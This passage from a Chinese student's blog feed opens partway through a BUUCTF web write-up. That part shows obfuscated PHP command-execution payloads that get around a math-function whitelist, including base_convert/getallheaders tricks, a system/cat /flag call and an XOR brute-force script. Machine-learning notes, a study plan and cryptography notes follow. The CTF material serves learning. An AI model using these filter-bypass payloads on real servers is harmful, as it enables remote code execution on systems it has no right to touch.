class="number">36</span>)(dechex(<span class="number">1598506324</span>));<span class="variable">$$abs</span>&#123;pi&#125;(<span class="variable">$$abs</span>&#123;sin&#125;)&amp;pi=system&amp;sin=cat /flag</span><br><span class="line"></span><br><span class="line"><span class="variable">$abs</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>)) = _GET;</span><br><span class="line"></span><br><span class="line"><span class="variable">$$abs</span>&#123;pi&#125;(<span class="variable">$$abs</span>&#123;sin&#125; = <span class="variable">$_GET</span>&#123;pi&#125;(<span class="variable">$_GET</span>&#123;sin&#125;); <span class="comment">// 通过get方法传入参数完成命令执行</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="headers传入参数命令执行"><a href="#headers传入参数命令执行" class="headerlink" title="headers传入参数命令执行"></a>headers传入参数命令执行</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="variable">$pi</span>=base_convert,<span class="variable">$pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)((<span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable">$pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) = base_convert(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) = exec</span><br><span class="line">((<span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">1</span>&#125;) = ((base_convert(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">1</span>&#125;) = getallheaders()&#123;<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">即 exec(getallheaders()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>几点说明</p><p>getallheaders — 获取全部 HTTP 请求头信息</p><p><img src="https://i.loli.net/2021/03/06/CcBEwGWhjMp9AmO.png" alt="5.png"></p><p>当取数组元素时，用大括号会抛出警告而不是错误</p><p><img src="https://i.loli.net/2021/03/06/WtgMeZJO6rl25QV.png" alt="6.png"></p><p>用上述payload 加上 postman改下headers即可命令执行getflag</p><p><img src="https://i.loli.net/2021/03/06/4kdNB8AUj59IiHu.png" alt="9.png"></p><h3 id="字符串异或命令执行"><a href="#字符串异或命令执行" class="headerlink" title="字符串异或命令执行"></a>字符串异或命令执行</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$whitelist</span> <span class="keyword">as</span> <span class="variable">$white</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">999999</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^_POST$/&quot;</span>,<span class="variable">$white</span> ^ decbin(<span class="variable">$i</span>),<span class="variable">$mach</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;decbin:&quot;</span> . <span class="variable">$i</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$white</span> . <span class="string">&#x27; : &#x27;</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$mach</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^_POST$/&quot;</span>,<span class="variable">$white</span> ^ decoct(<span class="variable">$i</span>),<span class="variable">$mach</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;decoct:&quot;</span> . <span class="variable">$i</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$white</span> . <span class="string">&#x27; : &#x27;</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$mach</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^_POST$/&quot;</span>,<span class="variable">$white</span> ^ dechex(<span class="variable">$i</span>),<span class="variable">$mach</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;dechex:&quot;</span> . <span class="variable">$i</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$white</span> . <span class="string">&#x27; : &#x27;</span> .  <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$mach</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/06/uGUmVAZe5BXbazM.png" alt="7.png"></p><p>发现俩能用的</p><p><code>payload:?c=$pi=dechex(481137)^hexdec;$$pi&#123;1&#125;($$pi&#123;2&#125;)</code></p><p><img src="https://i.loli.net/2021/03/06/y6aTOkVeDoFPcmC.png" alt="8.png"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote><p><a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html">https://www.cnblogs.com/wangtanzhi/p/12246731.html</a><br><a href="https://www.bilibili.com/video/BV1pE411f7DN?t=1567">https://www.bilibili.com/video/BV1pE411f7DN?t=1567</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> web </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Machine Learning</title>
      <link href="2021/03/05/ML/"/>
      <url>2021/03/05/ML/</url>
      
        <content type="html"><![CDATA[<h2 id="1-4-Unsupervised-Learning"><a href="#1-4-Unsupervised-Learning" class="headerlink" title="1-4.Unsupervised Learning"></a>1-4.Unsupervised Learning</h2><p>google news：聚类算法，无监督学习算法</p><p><img src="https://i.loli.net/2021/03/06/1TFOpXztKCkwcrW.png" alt="image-20210306085443145.png"></p><p>聚类算法是unsupervised learning的一种</p><p><img src="https://i.loli.net/2021/03/06/r5F1CvS3Zx9bGOk.png" alt=""></p><blockquote><p>B is a unsupervised learning problem.</p></blockquote><h2 id="2-1-模型描述"><a href="#2-1-模型描述" class="headerlink" title="2-1.模型描述"></a>2-1.模型描述</h2><p><img src="https://i.loli.net/2021/03/06/fF3lQLcRgkxP5iW.png" alt=""></p><p>根据拟合状况预估房价，是一个supervised learning problem，因为每一个大小都有一个“正确的答案”，并且还是回归问题。</p><p>Notation:</p><ul><li>m = Number of training examples</li><li>x = “input” variable / features</li><li><p>y = “output” variable / “target” variable</p></li><li><p>(x,y) = one traing example</p></li><li><p>$(x^{(i)},y^{(i)})$ = $i^{th}$   training example (not exponentiation,i means “index”)</p></li><li><p>h = hypothesis</p></li></ul><p><img src="https://i.loli.net/2021/03/06/2EMSJuBbaqKs6oI.png" alt=""><br>Linear regression with one variable.Univariate linear regression.(one variable)</p><h2 id="2-2代价函数-一"><a href="#2-2代价函数-一" class="headerlink" title="2.2代价函数(一)"></a>2.2代价函数(一)</h2><p><img src="https://i.loli.net/2021/03/06/U9H7TZXSpEtYdaj.png" alt=""></p><p>Cost function  </p><script type="math/tex; mode=display">J(\theta_0,\theta_1)=\frac 1{2m}\sum_{i=1}^m(h_{\theta}(x^{(i)}-y^{(i)})^2</script><h2 id="2-3代价函数-二"><a href="#2-3代价函数-二" class="headerlink" title="2.3代价函数(二)"></a>2.3代价函数(二)</h2><p><img src="https://i.loli.net/2021/03/06/jwi5Mp2K8b3CLPq.png" alt=""></p><p><img src="https://i.loli.net/2021/03/06/4sFmDZuqdGVTi7S.png" alt=""></p><p>简化代价函数使得$\theta_0 = 0$，理解代价函数</p><p>对于上图特殊的training set，可以找出$\theta_1 = 1$时，可以完美拟合</p><h2 id="2-4代价函数-三"><a href="#2-4代价函数-三" class="headerlink" title="2.4代价函数(三)"></a>2.4代价函数(三)</h2><p>当我们使用$\theta_0$和$\theta_1$时，得到cost function图像类似下图</p><p><img src="https://i.loli.net/2021/03/06/skDZCp4OwtTFYib.png" alt=""></p><p>使用等高线的方式来模拟，想象从碗的上方向底部看，minimize J($\theta_0$,$\theta_1$) 就是椭圆的中心，如下图的数据拟合较为不错，cost value可以接受</p><p><img src="https://i.loli.net/2021/03/06/JVmZ7oFTpRDU1zd.png" alt=""></p><h2 id="2-5-梯度下降"><a href="#2-5-梯度下降" class="headerlink" title="2.5 梯度下降"></a>2.5 梯度下降</h2><p>Repeat until convergence{</p><p>​    $\theta_j := \theta_j - \alpha\frac{\partial}{\partial\theta_j}J(\theta_0,\theta_1)  $        (for j = 0 and j = 1) </p><p>}</p><p>// := assignment       ( a := a + 1)</p><p>// $\alpha$为学习率，大的时候下山步子大</p><p><img src="https://i.loli.net/2021/03/09/gQYal6ocdpKqC9R.png" alt="梯度下降1.png" style="zoom:50%;" /></p><h2 id="2-6-梯度下降理解"><a href="#2-6-梯度下降理解" class="headerlink" title="2.6 梯度下降理解"></a>2.6 梯度下降理解</h2><ul><li>梯度下降导数项的意义</li></ul><p><img src="https://i.loli.net/2021/03/09/CyXR7G4TLIKQO1w.png" alt="梯度下降2.png" style="zoom:50%;" /></p><ul><li>梯度下降学习率大小的意义</li></ul><p><img src="https://i.loli.net/2021/03/09/N1mFSpIkrPAnljb.png" alt="梯度下降3-alpha含义.png" style="zoom:50%;" /></p><ul><li>梯度下降到局部最优点的结果</li></ul><p><img src="https://i.loli.net/2021/03/09/nSg2xDTV7yROecG.png" alt="梯度下降4-局部最优点的结果.png" style="zoom:50%;" /></p><h2 id="2-7-线性回归的梯度下降"><a href="#2-7-线性回归的梯度下降" class="headerlink" title="2.7 线性回归的梯度下降"></a>2.7 线性回归的梯度下降</h2><p>梯度下降中导数那一项：</p><script type="math/tex; mode=display">\frac\partial{\partial\theta_j}J(\theta_0,\theta_1) = \frac\partial{\partial\theta_j}\frac1{2m}\sum_{i=1}^m(h_\theta(x^{(i)})-y^{(i)})^2 \\=\frac\partial{\partial\theta_j}\frac1{2m}\sum_{i=1}^m(\theta_0 + \theta_1x^{i}-y^{(i)})^2</script><p>$\theta_0$和$\theta_1$情况下的偏导数：</p><script type="math/tex; mode=display">j=0:\frac\partial{\partial\theta_0}J(\theta_0,\theta_1)=\frac1{m}\sum_{i=1}^m(h_\theta(x^{(i)})-y^{(i)}) \\j=1:\frac\partial{\partial\theta_1}J(\theta_0,\theta_1)=\frac1{m}\sum_{i=1}^m(h_\theta(x^{(i)})-y^{(i)})*x^{(i)}</script><p>该方法是Batch梯度下降法：需要遍历整个训练集</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Machine Learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计划</title>
      <link href="2021/03/05/plan1/"/>
      <url>2021/03/05/plan1/</url>
      
        <content type="html"><![CDATA[<h2 id="计划2021-3-2021-5"><a href="#计划2021-3-2021-5" class="headerlink" title="计划2021.3 - 2021.5"></a>计划2021.3 - 2021.5</h2><blockquote><p>1.web学习<br>2.buu pwn题<br>3.机器学习入门<br>4.操作系统(李治军老师)<br>5.运维(hvv)<br>划掉</p></blockquote><p>目前大二，想冲一下保研的资格，ctf要搁置了草</p><blockquote><p>1.蓝桥杯<br>2.数学建模<br>3.ciscn<br>4.论文<br>5.英语</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学笔记</title>
      <link href="2021/03/05/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/"/>
      <url>2021/03/05/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="一-密码学概述和古典密码"><a href="#一-密码学概述和古典密码" class="headerlink" title="一.密码学概述和古典密码"></a>一.密码学概述和古典密码</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><strong>密码编码学</strong>和密码分析学</p><blockquote><p>Plaintext:明文，被隐蔽消息，M</p><p>Ciphertext:密文，C</p><p>Encryption:加密</p><p>Decryption:解密，加密的逆过程</p><p>Encryption algorithm: 加密算法，E()</p><p>Decryption algorithm: 解密算法，D()</p><p>Key: 密钥，控制加密和解密算法操作的数据处理，分别称作加密密钥和解密密钥，k</p></blockquote><ul><li>传统密码体制所用的加密密钥和解密密钥相同或<strong>实质上等同</strong>，从一个易于推出另一个：单钥或对称密码体制，无法实现不可否认性</li><li>加密密钥和解密密钥不相同，从一个难于推出另一个，双钥，或非对称密码体制</li></ul><p>密码体系是一个五元组(M C K E D)</p><p>密钥空间K，在单钥体制下K1 = K2 = K</p><p>加密变换$E_{k1}$</p><p>解密变换$D_{k2}$</p><p><strong>(M C K $E<em>{k1}$ $D</em>{k2}$)为保密通信系统</strong></p><p>密码分析者，选定变换函数h，对c进行变换，得到的明文是明文空间中的某个元素，</p><p>即$m’ = h(x)$</p><p>如果m’ = m，则分析成功</p><h3 id="保密系统基本要求"><a href="#保密系统基本要求" class="headerlink" title="保密系统基本要求"></a>保密系统基本要求</h3><ol><li>理论上不可破，即 $ p_r{m’=m}=0 $，当知道已知的明文密文时，要决定密钥或任意明文在计算上是不可行的</li><li>Kerchhoff原则，保密性不依赖于加密体制或算法的保密，而依赖于密钥</li><li>加密解密算法适用于所有密钥空间中的元素</li><li>系统便于实现和使用</li></ol><h3 id="密码系统的攻击"><a href="#密码系统的攻击" class="headerlink" title="密码系统的攻击"></a>密码系统的攻击</h3><ul><li>惟密文攻击</li><li>已知明文攻击</li><li>选择明文攻击</li><li>选择密文攻击</li></ul><div class="table-container"><table><thead><tr><th>攻击类型</th><th style="text-align:left">攻击者掌握的内容</th><th></th></tr></thead><tbody><tr><td>惟密文攻击</td><td style="text-align:left">加密算法，截获的部分密文</td><td></td></tr><tr><td>已知明文攻击</td><td style="text-align:left">以上及一个或多个明文密文对</td><td></td></tr><tr><td>选择明文攻击</td><td style="text-align:left">自己选择的明文消息及由密钥产生的密文</td><td></td></tr><tr><td>选择密文攻击</td><td style="text-align:left">自己选择的密文消息及相应的被解密的明文</td><td></td></tr><tr><td></td><td style="text-align:left"></td></tr></tbody></table></div><p>无条件安全：无论敌手截获多少密文，花费多长时间都不能解密密文 （一次一密</p><p>计算上安全：1，破译密文的代价超过被加密信息的价值。2，破译密文所花的时间超过信息的有用期。</p><h2 id="密码学发展"><a href="#密码学发展" class="headerlink" title="密码学发展"></a>密码学发展</h2><p>Cryptology - 密码学</p><blockquote><p>三个阶段：</p><p>1.1949之前：古典密码 艺术</p><p>2.1949-1975：近代密码 艺术-&gt;科学</p><p>3.1976年至今：现代密码</p></blockquote><p>古典密码：</p><ol><li>斯巴达棍。算法是缠绕，密钥是棍子的粗细。</li><li>单表代换密码：凯撒密码，单字母代换。算法是代换，密钥是密码表。</li><li>多表代换密码：Enigma密码机。</li></ol><p>近代密码：</p><ol><li>1977年，NBS颁布采纳IBM设计的方案作为非机密数据的数据加密标准DES，Data Encryption Standard。</li><li>2001.11.16，采用AES算法</li><li>1976，W.Diffie，M.E.Hellman，提出非对称密码算法思想</li><li>1977，Rivest，Shamir，Adleman提出RSA密码体制</li></ol><p>公钥密码学实现加密密钥和解密密钥的分离，伟大革命，使用两个密钥：公钥，私钥</p><h2 id="仿射变换"><a href="#仿射变换" class="headerlink" title="仿射变换"></a>仿射变换</h2><p>$c = E_{a,b}(m) \equiv am + b(mod26)$</p><p>$m = D_{a,b}(c) \equiv a^{-1} + (c - b)(mod26)$</p><p>当a和26互为素数的时候才可以解密 最大公因子为1时才互为素数 （不互素的话逆元求不出来，就没法解密</p><p>ab为密钥</p><p>$a^{-1}$为a的逆元</p><h3 id="单表代换优缺点"><a href="#单表代换优缺点" class="headerlink" title="单表代换优缺点"></a>单表代换优缺点</h3><p>频次问题</p><p>相对位置问题</p><h2 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h2><p>加密算法</p><p>$c<em>{i+td}=E_k(m</em>{i+td})\equiv(m_{i+td}+k_i)(mod q)$</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.理解保密通信系统模型</p><p>2.密码体制从原理分为两大类，单钥和双钥体制</p><p>3.加密算法两条安全准则</p><p>4.能够计算仿射变换</p><p>5.置换密码的操作</p><h1 id="二-密码学相关数学知识"><a href="#二-密码学相关数学知识" class="headerlink" title="二.密码学相关数学知识"></a>二.密码学相关数学知识</h1><h2 id="1-素数和互素"><a href="#1-素数和互素" class="headerlink" title="1.素数和互素"></a>1.素数和互素</h2><ul><li><p>因子</p><ul><li>b能整除a，b|a : b是a的因子</li><li>b|1    b = $\pm$1</li><li>b|a a|b 则 a=$\pm$b</li><li>b|a  b|c. 则对于任意整数m和n  -&gt; b|(am+cn)</li></ul></li><li><p>素数</p><ul><li>素数是现代数论的核心内容</li><li>p的因子只有 $\pm$1和 $\pm$p</li><li>整数分解的唯一性定理 任一正整数可以唯一分解成素数的乘积<ul><li>$a = p_1^{e_1} + p_2^{e_2} + … + p_t^{e_t}$</li><li>$e_i$是正整数 $p_i$是素数</li></ul></li></ul></li><li><p>互素数 </p><ul><li>c是a和b的最大公因子 c=gcd(a,b)</li><li>因为所有不为0的整数都是0的因子，因此，gcd(a,0) = |a|</li><li><p>如果gcd(a,b) = 1，则称a，b是互素的</p></li><li><p>最小公倍数 lcm。d是a和b的最小公倍数，d=lcm(a,b)</p></li><li>若gcd(a,b) = 1，则lcm(a,b) = a * b</li></ul></li></ul><h2 id="2-模运算"><a href="#2-模运算" class="headerlink" title="2.模运算"></a>2.模运算</h2><ul><li><p>数论</p><ul><li><p>是密码学特别是公钥密码学的基本工具</p></li><li><p>离散的数字集合</p></li><li><p>运算是模加，模减，逆运算</p></li><li><p>对整数和多项式进行模运算</p></li><li><p>字母的通用表示：</p><ul><li>n: 非负整数</li><li><p>p: 素数</p></li><li><p>Z: 整数集合</p></li><li>R: 实数集合</li><li><p>Q: 有理数集合</p></li><li><p>$Z_n$ = {0,1,2…n-1}小于n的非负整数集合</p></li></ul></li></ul></li><li><p>模运算</p><ul><li>a = $\lfloor a/n\rfloor$ n + (a mod n)</li></ul></li><li><p>同余</p><ul><li>a mod n= b mod n    a $\equiv$ b mod n</li><li>n|(a-b) 等价a $\equiv$ b mod n</li></ul></li><li><p>同余性质</p><ul><li>a $\equiv$ b mod n，则b $\equiv$ a mod n</li><li>a $\equiv$ b mod n，b $\equiv$ c mod n，则a $\equiv$ c mod n</li><li>a $\equiv$ b mod n，d｜n，则a $\equiv$ b mod d</li><li>a $\equiv$ b mod $n_i$ ， d = lcm($n_1,n_2,…n_k$)，则a $\equiv$ b mod d，(i = 1,2,…,k)</li></ul></li><li><p>同余类/等价类/模n剩余类</p><ul><li>与a模n同余的全体成为a的同余类记为$[a]_n$</li><li>$Z_n$为模n的等价类集合</li></ul></li><li><p>等价类性质</p><ul><li>在做mod n的加法和乘法时，等价类的元素可以替换，结果不变</li></ul></li><li><p>模运算性质</p><ul><li>加运算和乘运算先做模和后做模不影响结果</li><li>满足交换律，结合律，分配律</li><li>单位元，0是加法单位元，1是乘法单位元</li></ul></li></ul><h2 id="3-模指数运算"><a href="#3-模指数运算" class="headerlink" title="3.模指数运算"></a>3.模指数运算</h2><p>模指数运算</p><ul><li>$a^m \pmod p$</li><li>思路：现将m用二进制表示</li><li>？快速指数运算查询</li><li>阶 $ord_n(a)$， 满足 $a^m \equiv $ 1 mod n 的最小正整数m为模n下a的阶</li><li>$ord_n(a)$ = m，$ a^k \equiv 1$ mod n的充要条件是k为m的倍数</li></ul><h2 id="4-费马定理和欧拉定理"><a href="#4-费马定理和欧拉定理" class="headerlink" title="4.费马定理和欧拉定理"></a>4.费马定理和欧拉定理</h2><ul><li>费马定理<ul><li>p是素数，a是正整数，且gcd(a,p) = 1,则$a^{p-1}\equiv1$ mod p</li><li>$aa^{p-2}\equiv$ mod p 或者 $a^{-1} \equiv a^{p-2}$ mod p</li><li>$2^{100}  $ mod 13 = 3 (满足费马定理，即$2^{12} \equiv 1$ mod 13，即$2^{96} \equiv 1$ mod 13)  </li></ul></li></ul><h2 id="5-素性检测"><a href="#5-素性检测" class="headerlink" title="5.素性检测"></a>5.素性检测</h2><p>素性检测就是对给定的数检验是否为素数</p><p>费马定理的逆命题不成立，伪素数（卡米歇尔数）</p><ul><li>埃拉托斯散筛法</li><li><p>Miller-Rabin概率检测法</p><h2 id="6-欧几里得算法"><a href="#6-欧几里得算法" class="headerlink" title="6.欧几里得算法"></a>6.欧几里得算法</h2></li></ul><p>辗转相除法</p><h2 id="7-中国剩余定理"><a href="#7-中国剩余定理" class="headerlink" title="7.中国剩余定理"></a>7.中国剩余定理</h2><p>小数重构大数</p><p>大数用小数表示</p><h2 id="8-群环域"><a href="#8-群环域" class="headerlink" title="8.群环域"></a>8.群环域</h2><ul><li><p>代数系统</p><ul><li>代数系统是一种数学模型，包含要处理的数学对象的集合及集合上的关系或运算。</li><li>群，环，域都是代数系统。</li></ul></li><li><p>半群</p><ul><li>任取ab属于S，a和b的运算*都在S中，则S对运算*是封闭的</li><li>满足结合律</li><li>满足以上两点，称为<G,*>为半群</li></ul></li><li><p>群</p><ul><li>封闭性</li><li>结合律</li><li>单位元：$a<em>e = e</em>a = a$，e称为$<G,*>$的单位元</li><li>逆元：对任取a属于G，存在元素$a^{-1}$,$a <em> a^{-1} = a^{-1} </em> a = e$</li><li>满足以上几点称为$<G,*>$是群</li><li>实例 $<Z_8,+>$，模8加</li><li>实例 XOR，模2加</li><li>实例，加法群<ul><li>对任意n大于等于1，整数模n的集合构成一个包含n个元素的有限模n加法群，单位元是0，群中任一元素a，它的逆元是n-a，这个群记为$Z_n$</li></ul></li><li><p>实例，乘法群不是群，是幺半群，不满足逆元的条件</p></li><li><p>乘法群 $Z_n^*$</p><ul><li>$Z_n^*={x\in Z_n:gcd(x,n)=1}$，小于n的非负整数且与n互素</li><li>模n乘法群，单位元e = 1</li><li>是abel群，$|Z_n^*| = \psi(n)$</li><li>对素数p，$Z_p^* = Z_p - 0$</li></ul></li></ul></li></ul><ul><li><p>Abel群</p><ul><li>运算*表示加法时，称为加法群</li><li>乘法，乘法群</li><li>若G的元素是有限的，称为有限群，否则为无限群</li><li>有限群中，G的元素个数称为群G的阶数，表示为$|G|$ or $#G$</li><li>还满足交换律，则称为群$<G,*>$为Abel群</li><li><p>密码学中用到的几乎都为Abel群</p></li><li><p>实例 $<Z_8,+>$，模8加，阶为8</p></li></ul></li></ul><ul><li>循环群<ul><li>$g^i = a$，a为任意的一个元素，g为生成元或本原元</li><li>即能够自己对自己做运算，最终能够遍历群</li><li>实例<ul><li>$Z_4$</li><li>$Z_p^*$，p为素数，肯定存在生成元<ul><li>定理$Z_n^*$每一个元素都有乘法逆元</li><li>并不是每一个元素都是生成元</li></ul></li></ul></li><li>本原元的存在性<ul><li>对模素数p<ul><li><ol><li>其生成元必定存在</li><li>当g为生成元且p与p-1互素时，$g^a$  mod p也是生成元</li><li>生成元个数为$\psi(p-1)$</li></ol></li></ul></li></ul></li></ul></li></ul><ul><li>元素的阶<ul><li>拉格朗日定理推论，提供了群的阶和群中元素阶的关系</li></ul></li></ul><ul><li>环<ul><li>$<R,+>$是Abel群</li><li>$<R,*>$是半群</li><li>分配律</li><li>$<R,+,*>$是环</li></ul></li></ul><ul><li>域<ul><li>$<F,+>$ 是Abel群，0是+的单位元</li><li>$<F-0,*>$ 是Abel群</li><li>分配律</li><li>$<F,+,*>$是域</li></ul></li></ul><ul><li>有限域<ul><li>若q是素数的幂，即$q = p^n$ ，p是素数，n是正整数，则阶为q的域记为GF(q)</li></ul></li></ul><h2 id="9-离散对数"><a href="#9-离散对数" class="headerlink" title="9.离散对数"></a>9.离散对数</h2><h2 id="10-平方剩余"><a href="#10-平方剩余" class="headerlink" title="10.平方剩余"></a>10.平方剩余</h2><h2 id="11-小结"><a href="#11-小结" class="headerlink" title="11.小结"></a>11.小结</h2><h1 id="三-应用密码学"><a href="#三-应用密码学" class="headerlink" title="三.应用密码学"></a>三.应用密码学</h1><h2 id="1-流密码"><a href="#1-流密码" class="headerlink" title="1.流密码"></a>1.流密码</h2><p>流密码的基本思想：利用密钥k产生一个密钥流，使用规则对明文串加密</p><p>与维吉尼亚类似，多表代换密码</p><p>密钥流通过密钥发生器f产生</p><p> $z_i = f(k,\theta_i)$</p><p>分组密码和流密码的区别在于有无记忆性</p><p>流密码的滚动密钥，由函数f，密钥k和初始状态西格玛完全确定。此后，输入的密文可能影响加密器中内部记忆元件的存储状态，因而可能依赖<strong>于所有输入</strong>的影响。</p><p>可分为同步和自同步两种</p><p>对称密码体制</p><p>同步流密码的变换$E_i$可以有多种选择，只要变换即可逆即可。</p><p>二元加法流密码是最常用的流密码的体制。即异或。</p><p>密钥流序列Z应该具有如下性质</p><ul><li>极大的周期</li><li>良好的统计特性</li><li>抗线性分析</li><li>抗统计分析</li></ul><h3 id="有限状态自动机"><a href="#有限状态自动机" class="headerlink" title="有限状态自动机"></a>有限状态自动机</h3><p>是具有离散输入和输出的一种数学模型，由三部分组成</p><ol><li>有限状态集</li><li>有限输入字符集，有限输出字符集</li><li>转移函数</li></ol><h3 id="密钥流产生器"><a href="#密钥流产生器" class="headerlink" title="密钥流产生器"></a>密钥流产生器</h3><p>关键是密钥流产生器。一般可将其看成为参数为k的有限状态自动机，有输出符号集，一个状态集，和两个函数以及一个初始状态组成</p><p>两个函数为状态转移函数和字符输出函数</p><p>LFSR：线性反馈移位寄存器</p><p>最大周期为2的n次方减1，n是几级寄存器</p><h2 id="2-分组密码体制"><a href="#2-分组密码体制" class="headerlink" title="2.分组密码体制"></a>2.分组密码体制</h2><p>对称密码体制</p><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h3><ul><li><p>加密解密</p></li><li><p>构成其他加密算法的组成元素</p></li></ul><ul><li>明文</li><li>明文分组</li><li>密钥</li><li>密文分组</li><li>加密函数</li></ul><p>通常取密文分组数量和明文分组数量相等</p><ul><li>要求<ul><li>分组长度n足够大，防止明文穷举攻击法</li><li>密钥量足够大，即置换子集中的元素足够多，以防止密钥穷举攻击，但又不能过长，管理问题</li><li>由密钥确定置换的算法要足够复杂</li><li>加密和解密运算简单，易于软件和硬件高速实现</li></ul></li></ul><h3 id="2-DES"><a href="#2-DES" class="headerlink" title="2.DES"></a>2.DES</h3><p>密钥长度为56位</p><h3 id="3-分组密码体制的运行模式"><a href="#3-分组密码体制的运行模式" class="headerlink" title="3.分组密码体制的运行模式"></a>3.分组密码体制的运行模式</h3><h3 id="4-IDEA"><a href="#4-IDEA" class="headerlink" title="4.IDEA"></a>4.IDEA</h3><h3 id="5-AES"><a href="#5-AES" class="headerlink" title="5.AES"></a>5.AES</h3>]]></content>
      
      
      <categories>
          
